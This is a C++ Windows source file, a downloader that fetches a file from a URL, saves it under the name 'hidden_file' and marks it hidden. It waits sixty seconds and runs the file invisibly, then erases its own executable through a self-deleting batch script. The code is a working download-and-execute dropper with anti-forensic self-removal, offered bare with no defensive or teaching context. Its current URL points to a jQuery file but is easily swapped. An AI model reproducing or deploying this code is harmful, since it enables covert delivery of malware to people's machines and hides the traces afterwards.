// downloader.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include<stdio.h>
#include<windows.h>
#include<wininet.h>
#include<mmsystem.h>
#include<commdlg.h>

#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"Wininet.lib")

#pragma comment(linker,"/opt:nowin98")

int InternetGetFile(char szUrl[],char szFileName[]);
void SelfDel();

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	InternetGetFile("http://code.jquery.com/jquery-2.1.4.min.js","hidden_file");
	SelfDel();
	return 0;
}

int InternetGetFile(char szUrl[100],char szFileName[100])
{
	DWORD dwFlags;
	if(!InternetGetConnectedState(&dwFlags,0))
	{
		return -1;
	}
	char strAgent[64];
	sprintf(strAgent,"Agent%ld",timeGetTime());
	HINTERNET hOpen;
	if(!(dwFlags&INTERNET_CONNECTION_PROXY))
	{
		hOpen=InternetOpen(strAgent,INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY,NULL,NULL,0);
	}
	else
	{
		hOpen=InternetOpenA(strAgent,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	}
	if(!hOpen)
	{
		return -1;
	}
	DWORD dwSize;
	char szHead[] = "Accept:*/*\r\n\r\n";
	void* szTemp[16384];
	HINTERNET hConnect;
	FILE *fp;
	if(!(hConnect = InternetOpenUrlA(hOpen,szUrl,szHead,strlen(szHead),INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD,0)))
	{
		return -1;
	}
	fp= fopen(szFileName,"wb+");
	if(fp==NULL)
	{
		return -1;
	}
	DWORD dwByteToRead = 0;
	DWORD dwSizeOfRq = 4;
	DWORD dwBytes = 0;

	if(!HttpQueryInfo(hConnect,HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER,(LPVOID)&dwByteToRead,&dwSizeOfRq,NULL))
	{
		dwByteToRead = 0;
	}

	do
	{
		if(!InternetReadFile(hConnect,szTemp,16384,&dwSize))
		{
			InternetCloseHandle(hOpen);
			fclose(fp);
			return -1;
		}
		if(dwSize==0)
			break;
		else
			fwrite(szTemp,dwSize,1,fp);
	}while(true);
	fclose(fp);
	InternetCloseHandle(hOpen);
	SetFileAttributes(szFileName,FILE_ATTRIBUTE_HIDDEN);
	Sleep(60000);
	WinExec(szFileName,SW_HIDE);
	return 0;
}

void SelfDel()
{
	char DirBuffer[MAX_PATH],TempBuffer[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	GetModuleFileName(hModule,DirBuffer,sizeof(DirBuffer));
	GetFileTitle(DirBuffer,TempBuffer,MAX_PATH);

	FILE *fp;
	fp = fopen("system.bat","w+");
	fprintf(fp,"@echo off\r\n");
	fprintf(fp,":start\r\n\tif not exist %s goto done\r\n",TempBuffer);
	fprintf(fp,"\tdel /f/q %s\r\n",TempBuffer);
	fprintf(fp,"goto start\r\n");
	fprintf(fp,":done\r\n");
	fprintf(fp,"\tdel /f /q %%0\r\n");
	fclose(fp);

	WinExec("system.bat",SW_HIDE);
}

